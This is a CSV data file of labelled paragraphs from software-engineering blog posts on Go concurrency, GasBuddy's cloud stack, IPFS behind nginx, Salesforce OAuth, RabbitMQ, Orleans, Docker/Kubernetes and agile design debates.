1618,"In computer programming, concurrency is ability of a computer to deal with multiple things at once. For general example, if you are surfing internet in a browser, there might be lot of things happening at once. In a particular situation, you might be downloading some files while listening to some music on the page that you are scrolling, at the same time. Hence a browser needs to deal with lot of things at once. If browser couldnt deal with them at once, you need to wait until all download finishes and then you can start browsing internet again.","['Programming', 'Go Programming', 'Go Programming Language', 'Golang', 'Golang Tutorial']",3
1619,"Above are the few important differences but if you dive deep, you will find out amazing world of gos concurrency model. To highlight some of the power points of gos concurrency strength, imagine you have a web server where you are handling 1000 requests per minute. If you had to run each requests concurrently, that means you need to create 1000 threads or divided them under different processes. Thats how Apache server manages incoming requests (read here). If a Os thread consumes 1MB stack size per thread, that means you will exhaust 1GB of RAM for that traffic. Apache provides Thread Stack Size directive to manage stack size per thread but still, you have no idea if you run into a problem because of this.","['Programming', 'Go Programming', 'Go Programming Language', 'Golang', 'Golang Tutorial']",11
1620,"Please note: While this article uses IDA Pro to disassemble the compiled code, many of the features of IDA Pro (i.e. can be found in plugins and builds for other free disassemblers such as radare2. Furthermore, while preparing for this article I took the liberty of changing some variable names in the disassembled code from IDA presets like v20 to what they correspond to in the C code. This was done to make each portion easier to understand. Finally, please note that this C code was compiled into a 64 bit executable and disassembled with IDA Pros 64 bit version. This can be especially seen when calculating array sizes, as the 32 bit registers (i.e. eax) are often doubled in size and transformed into 64 bit registers (i.e rax).","['Programming', 'Reverse Engineering', 'Static Code Analysis', 'Malware Analysis', 'Cybersecurity']",3
1621,"A few years back I wrote a story about transforming Gas Buddys technology stack. Weve implemented a number of new services, business lines and tools as well as migrating a host of others from our legacy stack. In that time weve learned a great deal, validated some decisions, rued others and open sourced a bunch of it. This article provides an update on how our decisions turned out, what tools we developed to stitch this all together, and perhaps tells you some pitfalls to avoid. There is another version of this article where I would say what we would do if we were starting from scratch, and it would resemble this article but certainly not mirror it. Theres also another version of it where we go all-in on AWS-native services and worry about costs later, but given that Gas Buddy starts off at the top tier of most traffic based pricing models, thats a much different equation that a company starting from scratch where time to market is so much more valuable.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",6
1622,"Im not going to give __url__ or AWS their own sections. Node has been great for us, but I get that its partly preference. The JS package system is just too deep, and were not doing a ton of ML which would tip the scale to python (so far). Our adoption of React was both encouraged by and supporting of our decision to go with Javascript. 99.9% of the Javascript written at Gas Buddy is ES6+ using the same babel preset and Air Bn B inspired lint settings. AWS is expensive compared to other clouds, AWS does everything, you are not the first person to do that on AWS, and nobody got fired for choosing AWS.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",10
1623,"Serverless is all the rage these days, and for many good reasons (both the specific framework and the general technology). Personally, Im not yet sold in the generic use case. We get too much value out of the persistent local data and startup/teardown infrastructure, and Kubernetes makes almost all of the developer pain go away (it doesnt make the ops pain go away and serverless has many attractive characteristics on this front). We made a decision early on to have a specific service architecturefront tier APIs/web projects, back tier services and then persistence layers (Elastic/Postgres) which are typically accessed by only one service. Our deployable units are all named something-api, something-web or something-serv. I think this architecture has served us very well in terms of making things composable, secure, traceable and etc. I can agree with the proposal that all our -apis and -webs should be serverless. The persistence layers are moving towards serverless support (e.g. stateless postgres calls), but I still see value in the server for -servs. Additionally, the vendor lock-in required to do more than basic serverless right now is highit gets lower every day and by the time I finish this article maybe the argument doesnt hold, but the summary is that I continue to think microservices are a great choice for Gas Buddy, even though if I were to do it again today we would have a lot more serverless components.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",10
1624,"The micro part of our problem decomposition has been key, in that it compartmentalizes bad decisions. So long as the shared components have a high standard, the technical debt in the implementation of a single microservice is limited because we can just rewrite the whole damn thing. This allows teams to learn more linearly and for us to tailor the teams working on a project to the match between skills, project lifetime, demand curve and use of shared resources (like postgres). We do have several cases where an api just proxies to a serv, and that feels wasteful and something wed like to come up with a better answer for. The main symptom of this disease is Swagger specifications that reference or copy other specs. Both reference and copy have horrific versioning problems. Some sort of enterprise object specification repo would help, as could some sort of Graph QL coordinated effort, but the learning and adoption curve on those sorts of things were beyond my appetite given the changes we already had in front of us.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",10
1625,"I made a joke in the first article about how we might dislike Kong if it switched from Lua to Java. Funnily enough, part of the reason we dislike Kong is Lua. Its not a language we have reason to use in our stack (some in fluent and nginx, but minimal), and Kong was not baked enough to ignore the language choice. In the end, Id argue the main problem with Kong was the fact that its o Auth credential implementation is not especially well suited to non-third-party developer use cases. We used Kong o Auth for our mobile app, web login, and everything else. This results in multiple database rows per login. There was, in the version we use, a half baked token reclamation process, but it brought Postgres to its knees and as a result we have had times with hundreds of millions of rows in multiple tables that are essentially wasted space and effort.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",19
1626,"When we made this decision, it was anything but clear. The last thing we wanted was a low level cluster infrastructure thats unstable and has few users. Now, much like the generic concept of containers, I think Kubernetes is an obvious choice. For me, the key capability is that I dont think about the deployment process. We can deploy anything anytime anywhere and I dont worry that the mechanics of rollout will cause a problem or drop a single request. That confidence also took a number of modifications in our application infrastructure, such as __url__ socket draining, robust logging and attention to cleanup code so that the service doesnt just get killed. But Kubernetes does a great job of representing configuration to make a deployment flow that works for our team and workloads.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",10
1627,"Kubernetes hasnt been all roses though. Our initial cluster was handcrafted with loving care, because Kops was barely real and made some decisions we didnt love at the time. Kops has come a long way, mainly around cluster upgrades and expanding choices of underlying infrastructure components. We have three clusters (production, payments, and staging) and two of them are now using Kops. However, the one with stateful services (Rabbit MQ, etcd) is still on a very old version of Kubernetes. There have been several upgrades to Kubernetes that require meaningful planning and risk downtime that we just didnt want to invest the resources to mitigate. We kept telling ourselves wed just move to Kops and get two birds with one stone, yet here we are a year later barely closer to upgrading that cluster. That is mostly our failing, for sure, but kubernetes didnt help with so many breaking changes.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",10
1628,"When I started, Mongo DB was still the rage even though the shine was coming off. I knew the parts of the system I was most concerned about were going to need to be fully ACID compliant, so I figured Postgres was at least a part of the solution. As we built more components, we were constantly surprised at how flexible Postgres is. We have databases running v8 to transform complex data structures with transactional integrity and a single database roundtrip, we have partial indexes that dive into JSONB columns on tables with tens of millions of rows, and we also have traditional transactional payment systems that are perfectly idempotent and have read replicas and all that normal database stuff. Im not sure Ive ever thought of a data storage or access problem Postgres cant solve, and usually in a way where we look at the developer next to us and say check this crazy s**t out! We are currently still running Postgres RDS as opposed to Aurora Postgres for our production databases. We had bad experiences with auto-incrementing values when migrating from PG to Aurora/PG and never tried again for fear of what might happen. RDS performance in AWS isnt great, and we made a mistake by trying to stuff all our logical databases on a single instance. Moving them would require downtime or significant investment in code changes or tooling to avoid the downtime, and so far its always been easier to click the pay Amazon more for a bigger thing button. There have been a few datasets where it would probably be more cost efficient to store in a document oriented store (like our Drives feature that allows you to log all your drives, which are often a frequent and large set of points and speeds and such).","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",8
1629,"There are search workloads that didnt initially seem a good fit with postgres (I think we were wrong about several of them)usually with massive infrequently accessed datasets (e.g.logs), or with text or complex geo search patterns for which we felt something like Elastic Search would be a better match. The truth is I havent actually had to use ES much because others on the team have worked on those projects, but I have been the victim of ES more times than I can count. Our ES cluster(s) are the most expensive component of our AWS infrastructure (or #2 at best). If you add in the time the ops and data teams have to spend managing it, its not even close (which Ill discuss a bit more in Logging). I would rather have expected more from Postgres in cases like POI search and either used a managed ES cluster for high volume data or used another system like Red Shift or S3. It has not been easy to deal with ES during development and testing either, especially when compared to postgres/redis/etcd. The query language is powerful but highly specialized, which makes it harder for developers to get going and easy for them to blow things up by making hard things look easy. In fairness, I think if we doubled down on ES we would be a lot happier about it, but sometimes you dont want to invest that amount of your constrained resources on the tool instead of the product.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",8
1630,"We had one thing righta common logging framework with identifiers that allow full visibility into the path of a request was crucial. We baked it into our open source opinionated service module. Initially we used Winston but recently moved to pino for speed and to take advantage of container and cluster logging infrastructure rather than going directly to a data store. Weve built a number of tools to monitor the logs in realtime and search for specific requests and such, though they are mostly half baked. We use kibana as well, which is three quarter bakedit doesnt visualize the traffic well and search isnt super well tuned for the use case (the other day a search didnt work because I put quotes around a number by accident). BUT, the real headache has been Elastic Search because the volume of log data is gigantic and heterogenous. Weve had various problems dropping logs because the data type ES saw in that field first was numeric, and some other service used the same field name for a string. Often, ES would just fall over and then were not only having to deal with that outage but were losing logs or backing up the log shippers until they bring a cluster to its knees.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",11
1631,"Our entire build process for our new stack CI/CD/container deploymentis run by Wercker. This has been true since the beginning Its probably done 100,000 builds for us. The main reason we chose it was the ability to use a docker-compose like syntax to bundle services like postgres into a CI pipeline. Its been great for usit rarely goes down and if and when it does theres usually someone around to tell us whats up. It has been the highest leverage tool we have because we have not paid a penny for it. The problem is that it only runs 2 jobs at a time on the free tier, and the next higher tier is thousands of dollars a month. The pricing is just completely and totally broken, and Oracle (which purchased Wercker) seems to be trying to convince people to use their cloud by teasing Wercker integration. The chance of us leaving AWS for Wercker is -100%. I would hate to have to manage our own Concourse or equivalent, but thats the next best option. We would pay a couple hundred bucks a month without question for a dedicated pipeline in wercker. But they wont take our money, because Oracle is Oraclin. Next they are going to propose a billing model that has to do with how many lines of code are in my project.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",10
1632,"The web properties were the last major technology category we modernized at Gas Buddyi.e. we spent most of our time on persistence layers, back end services and APIs. We chose React for a bunch of reasons that I would just be parroting from the dozens of articles elsewhere on the net. However, there are still dozens of decisions inside React that are much more nuancedto redux or not to redux? How should bundles be shared across independent projects? How do you package react components to minimize repetition in both work and bundle size? What UI frameworks do we use or do we build our own? Which CSS flavor (modules, JSS, Post CSS, Less) should we use? How do we test (Jest, tap, enzyme)? Should we make storybooks for everything? We are at a point now where we dont all agree on these answers. I hate redux, because this isnt Facebook. We dont have hundreds of engineers and thousands of complex flows to share. I strongly prefer unstated, which reduces the number of files I have to touch whenever I want a button click handler to at most 2 instead of at least 4 (action enums, reducers, action creators, and the component). As we try and share more code in our mobile apps for non-high traffic and non-input heavy features, bundle size is crucial, and I even like preact if I can get away with it. We started out using semantic-ui which was convenient for our internal UIs, but way too big for mobile views and weve built our own components now (in most cases). My views have changed on these answers in the eighteen months since we started Reacting, and our code reflects all of our learning curves and changing opinions. React itself is also changing rapidly especially the idioms in common use. Hooks and suspense are going to make a huge impact on React code in the next year.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",19
1633,"Message queues are an under-appreciated part of large software systems. Guaranteed delivery, ordering, idempotency, scalable workers and other patterns are hard to get right with databases or pub/sub tools, especially when it comes to domains like payments (for those not familiar with Gas Buddy, we have processed hundreds of millions of dollars of fuel purchases and given away millions of dollars of free gas, as well as being a crowdsourced gas price resource). AWS has SQS and other cloud providers have similar offerings, but as of a couple years ago, they had limitations (in addition to vendor lock in) that made them unusable for our use case. Enter the wonderfully configurable and well-tested Rabbit MQ. It can do single delivery, it can do topic routing, it can be run in clusters, it can slice bread But its also quite old, and was not written with modern infrastructure in mind(e.g. Network partitions happen more frequently than we would like, and it is not easy to build a Rabbit MQ cluster that handles this well (its gotten a bit better over the past year with cluster formation and automatic recovery). As a result, weve coded on the assumption that Rabbit MQ is good at its job (it is) but never the system of record. All our operations assume that they may have run already, or that they may be running concurrently in some other queue processing worker (we contributed to the etcd-based microlock project mainly to provide control over that concurrency). So perhaps SQS or similar would have been fine given that freedom. If I was starting from scratch today, I would still use Rabbit MQ, but I would be a lot less excited about all the problems it was going to make go away.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",10
1634,"I didnt touch on mobile much in this article because there hasnt been nearly the amount of change in that code base (although there has been plenty). There are no shortage of problem areas for our mobile apps that have had material impact on the quality of the user experience and thus on our happiness with our own product. Most of those issues are not about code but about process and trying to grow a free app into a growing business. This can be jarring for consumers that have become used to the old Gas Buddy. Those long time Gas Buddies are of course crucial to our success and we need to be better for them as well as the newcomers. This is a strong focus area for us in 2019, and hopefully that will become clear in the next couple of months (for example, were finally going to do search-along-route, because duh).","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",17
1635,"We choose the MIT License by default, because Go Beavers! Almost all of our open source modules are exclusively used by us. In other words, basically none of them became widely used or modified by others. Thats fine by uswe still hope it showed up in Google searches for people having problems or that it led us to contribute back to other open source efforts. Perhaps more importantly, it set the tone for our expectations of ourselves in terms of hacks and writing code you hope nobody ever looks at. What it did NOT do is improve our documentation habits. Modern code inherently needs less comments (IMHO), but that doesnt mean it documents itself from a usage perspective. Had we had more external engagement on our open source efforts, we probably wouldve been forced to be better about that. The learning curve for our various platform decisions was steep, and it wouldve been better with a more cohesive documentation strategy, but that would have reduced iteration speed and undoubtedly led to documentation becoming out of date and misleading without significant investment.babel-preset-gasbuddy: A single babel@7 preset that is used to build our server code and React code. We add optional chaining, class properties, and CSS module handling to a @babel/preset-env base. It also supports React modules such that we still get tree shaking (removing unused code) from client bundles when using a shared node module with React code in it.eslint-config-gasbuddy: a linter configuration based on Air Bn Bs style guide with a few minor deviations around line length, loops and parameter reassignment. Most of the deviations were recognizing existing patterns that werent worth changing rather than intentional rejection of Air Bn Bs decisions. Except for the 100 character line length limit, because its not 1995 anymore. @gasbuddy/service: This express-based service infrastructure module runs beneath everything we have, even when it doesnt expose an HTTP endpoint (like queue workers and batch jobs). It manages inter-service connections, persistent storage (ES, postgres, and more), logging and infrastructure interfacing (e.g. It is based loosely on Pay Pals Kraken, but adds a configuration based shared object store like Expresss middleware chain. We hang this off the express request, via things like req.gb.logger and req.gb.rabbitmq. These hydrated objects come to life via @gasbuddy/hydrate and we wrap a variety of infrastructure components in shims that allow them to be configured from JSON configuration files. These include configured-pino, configured-etcd-client, configured-swaggerize-express, configured-prometheus-client, configured-swagger-client, configured-elasticssearch-client, configured-rabbitmq-client, configured-redis-client, and configured-postgres-client.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",16
1636,"Ill let you know the conclusion when there is one. For now, were continuing to evaluate new and old technologies, and we are certainly at a point where the delta from existing decisions matters as much as the quality of the shiny new object. We need to continue to move more of the high frequency activities to the new stackincluding system-of-record for credentials and user names, price validation and some other big parts of our solution. We still have a big SQL Server HA cluster in our colo facility, although the load on it has been significantly reduced since the early days. These systems have never risen to the top of the list of pain points, and given the risks of even moving them logically as-is, they will hang on for a long time. Hopefully my next article will be about how we finally closed down our cage.","['Kubernetes', 'Gasbuddy', 'Postgres', 'Scaling', 'Cloud Computing']",10
1637,"But first why do we want to go to all this trouble in the first place? You dont need to do any of this to simply run a normal go-ipfs peer. In fact, if you followed our previous tutorial, you already have one going! But, if you want to run a secure gateway, or want to be able to connect to browser-based peers (like those running Apps), then these steps are neccessary. By using secure protocols, we ensure traffic between your peer and browser-based peers is encrypted and private. Also, the Web Crypto API used by js-ipfs in the browser requires a secure origin, so it is useful to have a secure gateway for accessing them. But dont take our word for it! We encourage you to read up on web security and learn for yourself why securing your web-traffic is important for a safer web experience.","['Tutorial', 'Software Development', 'Dapps', 'Nginx', 'Decentralization']",11
1638,"So the first step to enabling secure websocket connections to an IPFS peer node is to run all connections through a reverse proxy server. There is an existing tutorial that goes through some of these steps, and which provided some of the inspiration for this post. Nginx is one of the most popular web servers in the world and is responsible for hosting some of the largest and highest-traffic sites on the internet. It can be used as a web server or reverse proxy, and is well-supported on most operating systems. Much of the initial Nginx setup comes from this excellent tutorial from Digital Ocean. As in our previous post, unless otherwise stated, the following commands should all be entered into your Terminal, after having sshd into your EC2 instance. If that previous sentence sounds like gibberish, go back and read Tutorial Part I.","['Tutorial', 'Software Development', 'Dapps', 'Nginx', 'Decentralization']",11
1639,"Ok, so you might be wondering at this stage: why do I need a custom domain name to use IPFS? And the answer is, you dont! You only need one if you want to support secure TLS connections. Ok, but why do I need a domain name to support secure TLS connections? Because we need to be able to prove that we control the instance for which we want a browser-trusted certificate. The easiest way to do that is to point our domain name to our instance, and have the Lets Encrypt CA look at the domain name being requested and issue one or more sets of challenges. Its a complicated process under the hood, so we encourage to you check out the Lets Encrypt website for more details.","['Tutorial', 'Software Development', 'Dapps', 'Nginx', 'Decentralization']",11
1640,"If you already have access to a custom domain name, great. Otherwise, you could create a random domain name, and then register it with someone like Go Daddy. Chances are, if it really is just a random string of characters, itll be cheap. Ok, so I registered a domain name with Go Daddy ages ago for my personal blog, so Im going to add a sub-domain that points to my EC2 instance for which Ill request an SSL cert (more on that in a moment). Whichever domain-name registrar you use, they should have facilities to edit CNAME records. Youll want to add a subdomain that points to a server name. For Go Daddy, this looks something like this: You should be able to test that things are working by typing the above subdomain (ipfs.my-domain-name.com) into your browsers address bar. If you see the same Nginx welcome message as above, things are working! Now lets add some configuration options to our Nginx setup so that we can super-power our IPFS peer and serve something more interesting than a welcome page.","['Tutorial', 'Software Development', 'Dapps', 'Nginx', 'Decentralization']",11
1641,"The first server entry above is what is serving up that welcome page. All the lines with the # managed by Certbot comment are setting up the TLS/SSL certificate information so that your server knows how to securely connect with any clients connecting to it. Were going to delete theroot entry in this section and change the location entry to point to our gateway (if you enabled this in the previous tutorial, otherwise, you can just delete this entry). The location entry should now look something like this: The second server entry above simply permanently (301) redirects port 80 traffic to port 443, and defaults to 404 otherwise. These numbers are HTTP codes, which you can lookup for reference. We arent going to touch this entry at all.","['Tutorial', 'Software Development', 'Dapps', 'Nginx', 'Decentralization']",7
1642,"Notice weve used 8081 as our websocket (ws) connection port, but left our regular tcp connection port as 4001. This is because we arent managing this port through our Nginx reverse proxy, so we can just let it pass through unchanged, whereas we want Nginx to manage our secure websocket support. Ok, so lets restart our IPFS daemon (sudo systemctl restart ipfs), and test things out. If youve enabled your secure gateway, go ahead and point your browser to __url__ response.","['Tutorial', 'Software Development', 'Dapps', 'Nginx', 'Decentralization']",11
1643,"Consider the example of fixing bugs. Lets say you discover a small bug in some code that is repeated in several projects. How do you approach fixing it? You would first need to fix the code in at least one of the projects. Once you have the fixed code, you probably also want to apply the fix to all other projects that have the issue. But how would you find all of them? You may have tens of projects that use the same code or a similar pattern of code, but you may not easily remember all of them. For each project that you suspect may have the bug, you would need to manually check the code, find the part(s) that have the bug, apply the fix, test to make sure the code still works, and reproduce any results that may change due to the fix. You may even have shared your code with others. You would need to somehow let them know about the bug and how to fix it This is a nightmare! Imagine having one central version of your code that you can apply the fix to and then immediately, every project that uses that piece of code would have access to the latest debugged version. Both your projects and everyone elses. You dont necessarily want the code in all of these projects to automatically change to the new version but you would like everyone to be able to do that with a single command, without having to search around in the code and copy and paste things around. That is what package management does. For each project, the package manager keeps track of all pieces of code that the project depends on (dependencies). It also keeps track of the exact version of each dependency that is being used by the project at all times so that you have a documentation of when the buggy version was replaced with an updated version.","['Matlab', 'Packman', 'Package Management']",13
1644,"In addition, every operating system needs a whole bunch of storage space, which could otherwise be used elsewhere. This is best illustrated in the following graphic: The graphic shows a classic hypervisor architecture with three virtual machines. Okay, basically the points OS and VM belong together, but to compare the graphics better with the container counterpart, I have listed them separately here. In return, lets look at the structure of a container-based architecture: As you can see, the layer of hypervisor and VMs disappeared. The containers in which the applications run share the operating system. This approach is much lighter, since no entire OS needs to be loaded to start a container. When you try Docker, you will notice that a Docker container usually takes less than a second to launch. In addition, much less storage space is generally required, as the various operating systems are no longer required.","['Docker', 'Containers', 'Containerization', 'Software Development', 'Introduction']",7
1645,"Orleans is an open source actor framework built by Microsoft research, and was used for halo cloud functionality! Another __url__ actor framework is AKKA.net, though Ive not worked with itand barely Orleans for that matter. Anyway From Wikipedia: In a monolithic system, you can more or less only scale up. With systems built using microservices, actors, etc, you have the option of scaling out. What does scaling up vs out mean? To scale a system up, means adding more RAM, more CPUmore resources, to the hardware in which your system runs; but you are still constrained to a single box. To scale out means you can just add a brand new machine, generally to a cluster of some sort, that allows your system to much more easily add additional resources. Sure, you can always add more RAM/CPU to your existing machines in a microservices system, but you also have the option to have more machines! With all the cloud services, containerization, and VMs readily available in todays world, it can be extremely simple to spin up and down resources as necessary. Just add a new node to the cluster! Note all this information, and in further detail, can be found in the Orleans documentation. Orleans works off of a few concepts: Grainsthe virtual actors and/or primitives that are described in the actor model definition above. Grains are the objects that actually contain your logic that is to be distributed. Each individual grain is guaranteed to operate in a single-threaded execution model as to greatly simplify the programming, and avoid race conditions. The grains are written in an asynchronous manner, and are intended for very fast running operations (< 200ms IIRC)though Im using it for operations that take MUCH longer, maybe I can do a post about that at some point if everything works! Silosthe area where your grains are kept. A silo can contain many grain types, as well as many instantiations of those types, depending on your needs.","['Actor Model', 'Software Architecture', 'Software Engineering', 'Software Development', 'Dotnet Core']",11
1646,"This allows for the scale out portion of Orleans. If more or less resources are needed, you can simply register or kill silos on your cluster. Im hoping I can put together some more functional application as I learn more, but just to get started An Orleans application consists of a few separate pieces, generally all as separate projects: Grain interfaces Grain implementations Orleans Silo host Orleans Client Lets get started! Ensure you have __url__ core sdk installed as well as an IDE of choicelike Visual Studio or Visual Studio Code Run a few commands to get our projects started: Add Nu Get packages through the manager, console, or csproj file to look like Grain Interfaces / Grains csproj: Client csproj: Server csproj: Add project dependencies between the orleans projects. Grains, Client, and Server should all depend on the Grains Interfaces project. The Silo Host project should additionally depend on the Grains project. It should all look like: Thats all thats needed to get started with getting started with Orleans! The repo at this point in time, while minimal, can be found at: __url__ Microsoft.","['Actor Model', 'Software Architecture', 'Software Engineering', 'Software Development', 'Dotnet Core']",7
1647,"Now choose the Selected OAuth Scopes you need. I chose Access and manage your data (api). (If you dont know what you need I cant help you, sorry)Thats all we need for a basic integration, so hit Save. You should see: It looks like the app was created, but (if you did not enter a Callback URL) when we hit Continue we see: Now, if you go to the Salesforce documentation Defining Connected Apps, it will give you information on Callback URLs, but will not tell you what to do if you dont need one. It took me a minute to figure it out, but you can enter no:callbackurl to bypass the validation: Now hit Save then Continue and you should see something like: Scroll down to the API (Enable OAuth Settings) section and youll find the magic credentials you need to integrate an external app with your Salesforce instance: Now that we have the required credentials to interact with our Salesforce org, we may need to take 2 additional steps. I am not 100% sure these are both required, but I know that before I completed these tasks, I kept receiving this error response:{""error"":""invalid_grant"",""error_description"":""authentication failure""}Scroll down further to the section: Trusted IP Range for OAuth Web server flow. You will need to enter the IP addresses or ranges that will be calling out to your Connected App.","['Salesforce', 'Rest Api', 'Oauth', 'Connected App', 'Integration']",15
1648,"Edit: More recently I encountered this error for another reason: If you see this error, you may not need to set the trusted IP ranges. I received this error when making a call from Postman to Salesforce. I had to prepend my Salesforce password (for the org I was calling out to) to my Security Token. In other words, if my password was 123 and my Security Token was XYZ, I had to use 123XYZ as the value for password. In the params it would look like password=123XYZ. When I did this I didnt have to set the IP ranges.","['Salesforce', 'Rest Api', 'Oauth', 'Connected App', 'Integration']",11
1649,"With Rabbit MQ, we are going to start by setting up the client. Before you begin, you must have Rabbit MQ installed and running on your system. If you have not already done this, you may do so here. After that, in our __url__ we start with the following: The above small snippet sets the messaging server and the port. The code also handles authenticationthe guest, guest part represents where a login and password can go. Next, we setup declare a queue.","['PHP', 'Web Development', 'Prodigyview', 'Laravel', 'Microservices']",7
1650,"We have now declared a queue named video_queue that we will send our messages too. With Rabbit MQ, we can declare multiple queues (image processing, sending emails, etc) for sending messages to different locations. Now lets create the data we want to send over. Imagine it as a user uploading a video and now we have to convert the video so it works on all devices. We can create a simple definition like below: Take note above, we are sending the URL of the video we want to process. We DO NOT want to send an actual video file because of the amount of time, server resources and blocked I/O that would take, making it very inefficient and impractical. We want to send a reference, ie an url of the video saved to cloud storage, to our video servers.","['PHP', 'Web Development', 'Prodigyview', 'Laravel', 'Microservices']",11
1651,"Next, we are going to use wget, a Linux server function to download the video onto the server for processing. Why wget and not a file reader object or a function like file_get_contents? Any function that reads a file into memory is BAD for our servers. Video files can easily reach gigabytes in size, and that will eat through your memory. Instead, we want to stream files to our server, aka read a file byte by byte. While a php file reader using fopen and buffers is ok, wget does a very nice job at streaming large files and should have less latency than most functions in PHP. We can use wget with the exec command.","['PHP', 'Web Development', 'Prodigyview', 'Laravel', 'Microservices']",11
1652,"As we embraced a polyglot development community we saw a proliferation of application frameworks. In the past we could share modules and libraries to define the contract between infrastructure and applications. Common libraries become a significant overhead if they have to support multiple languages. We quickly went from only supporting Java to adding support for various other JVM-based languages, node.js, Python, and Go. Moving to containers, we were able to retain conventions for handling logging and configuration, but new interactions became necessary, including service discovery and routing via a service mesh. We found a reason to map out the way application code interacts with underlying infrastructure.","['Cloud Computing', 'Open Source', 'Cloud Native', 'Container Orchestration', 'DevOps']",10
1653,"However, I emphatically dont believe that production coders should do production design. That would be equivalent to asking the programmer to do the bookkeeping. Sure, they are probably capable of it, but why? What a waste of good programmer talent on common bookkeeping. Good programmers and good designers are rare. It is foolish and wasteful to make them work outside of their particular special skill.","['Software Development', 'Agile', 'Should Designers Code', 'Design', 'Process']",12
1654,"The truly serious fault with all of these arguments is that they avoid the single most important question: how do we create software? A lot of software gets built every day in the world, but that doesnt mean that we actually know what we are doing. Stuff does get built, and human nature being what it is, we regard that as normal. But infamously, in the waterfall world of enterprise development, some 80% of all software projects fail. We have been building crappy software systems for decades, and we still cant seem to figure out how to do it effectively. Typical projects never get out the door. Those that do get deployed are often pathetically weak versions that lack power and flexibility.","['Software Development', 'Agile', 'Should Designers Code', 'Design', 'Process']",12
1655,"Agilistas gloat over the failure of conventional software development methods, but their more modern methods of creating software arent significantly better. Mostly the failures are smaller, faster, and easier to hide. I dont want to get into an argument on this point, because I think that agile is a wonderful and tremendous leap forward in the world of practical software development. But it sure hasnt lived up to its billing. It is notoriously difficult to perform at scale. It often sidelines real user-centered design. It is reactive rather than proactive. And worst of all, many of its practitioners utilize managerial and technical hand-waving, smoke-blowing, bogus claims, and prestidigitation as a fig leaf to conceal ignorance, incompetence, and a refusal to work well with other necessary disciplines, most notably, interaction design (Yes, this is a blast at agile, butfor the sake of perspective I believe that agile is better than all the other development methods we have).","['Software Development', 'Agile', 'Should Designers Code', 'Design', 'Process']",12
1656,"Worse yet, is that teams are constantly bickering over turf, blaming the various disciplines for their inability to meet deadlines. There are people who claim that software deadlines is an oxymoron, and establishing them is prima facie evidence of a lack of understanding of the medium. Frankly, Im one of those people. Just about every single coding effort is a sally into the unknown, and it usually takes a couple of trips through to learn the territory. Im fond of comparing software development to walking through a minefield: if you dont step on a mine, its quick and easy. Anybody who gives you a prediction of how long software development will take is dissembling. And if you ask someone for that prediction, you are encouraging prevarication, and you are sustaining the industrywide myth that developing software is predictable.","['Software Development', 'Agile', 'Should Designers Code', 'Design', 'Process']",12
1657,"But, what is driving this containerization culture and how will it help you? Unlike traditional monolithic application, a micro-service application is a cluster of smaller services. These services stack upon each other to offer the holistic view of what we see and interact with. A simple application like taxi hailing service is hundreds of micro-services working together. And in the current era of computing, we dont expect them to go down. They have to be up 24x7 and performing the same irrespective of the holiday or peak season. These are our reliable, fault tolerant, scalable, resilient and reactive distributed systems. Lets see how do abstractions like Docker containers and K8s help with these.","['Docker', 'Kubernetes', 'Containerization', 'Containers', 'Cloud']",10
1658,"Consumers are no longer willing to have a CD for a new software. The applications are moving away from traditional models to online services. These services are available all the time and rolling out new features weekly or monthly. The days of the past are gone, where it is OK to have a downtime of few hours for an application upgrade. The delivery teams are shrinking and so are the release cycles. The critical differentiators between competitors is shrinking to agility and time to market.","['Docker', 'Kubernetes', 'Containerization', 'Containers', 'Cloud']",16
1659,"You can use templates to declare what services and their versions to run. These templates can also take configurations like replica counts, limits, quotas, etc,. K8s API takes care of the rest, to make sure production state is always consistent to the template. It is a matter of applying the new template to K8s to push a new release or rollback the earlier one. K8s also use features like rolling update for zero down time deployments. It further self-heal and restore the system in case of any failures.","['Docker', 'Kubernetes', 'Containerization', 'Containers', 'Cloud']",18
1660,"Docker containers provide immutable packaged micro-services that are distributable and atomic. K8s API offers load balanced orchestration on top of these decoupled micro-services. They allow selective scaling, version control and rolling updates without incurring downtime. And all these with the help of declarative templates that apply and update in a matter of minutes. Furthermore, all major cloud vendor now provide auto-scaling features with K8s. It means scaling up and down the physical infrastructure in minutes.","['Docker', 'Kubernetes', 'Containerization', 'Containers', 'Cloud']",10
1661,"These isolations allow many environments to share the same infrastructure. There are further controls for advance workload distribution like resource limits and co-location. Furthermore, K8s is a proven technology with hundreds of production usage. It adds reliability, maturity and consistency to the operations process. Any changes in application scaling are few easy commands without any sysadmin expertise. It takes a small team to handle the delivery of hundreds of service and products. The hassle of installation and maintenance is also going away as more cloud vendors are supporting the ecosystem. Almost all cloud vendors offer managed K8s services with money baked SLAs.","['Docker', 'Kubernetes', 'Containerization', 'Containers', 'Cloud']",10
1662,"Another aspect of agility and scalability is also related to architectural choices. One of the principles Kubernetes enable is the mesh communication, unlike the monolithic ways of doing it. I describe some of these options here: It all started with bare-metal machines and huge warehouses. There, a typical new provisioning meant weeks or months. It then moved to the Paa S cloud services which offered faster agile delivery. But, that also meant that developers had to learn the way of cloud technology. The steep learning curve and no portability support made it harder to switch vendors.","['Docker', 'Kubernetes', 'Containerization', 'Containers', 'Cloud']",10
